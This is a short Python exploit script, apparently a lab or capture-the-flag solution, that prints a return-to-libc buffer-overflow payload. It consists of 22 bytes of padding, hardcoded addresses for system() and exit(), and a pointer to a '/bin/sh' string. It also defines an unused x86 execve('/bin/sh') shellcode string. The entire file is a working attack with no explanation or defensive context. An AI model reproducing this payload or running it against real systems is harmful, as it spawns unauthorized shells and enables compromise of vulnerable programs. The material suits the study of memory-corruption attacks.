#!/usr/bin/python3
from struct import pack
#from shellcode import shellcode
import sys

shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

shell_str = b"/bin//sh\x00"
padding = b"A"*22

#shell_str_addr = b"\x96\xf9\xfe\xff"
shell_str_addr = b"\x39\x8a\xfe\xff" 
ret_addr = b"\x52\x9d\x04\x08"
system_addr = b"\xd0\x18\x05\x08"
exit_addr = b"\x69\x68\x0b\x08"
#sys.stdout.buffer.write(padding + system_addr + ret_addr + shell_str_addr)

#sys.stdout.buffer.write(padding + system_addr + ret_addr + shell_str_addr)
#sys.stdout.buffer.write(b"/bin/sh\x00" + 14*b"A" )
sys.stdout.buffer.write( padding  + system_addr + exit_addr + shell_str_addr + b"A" + b"/bin/sh")
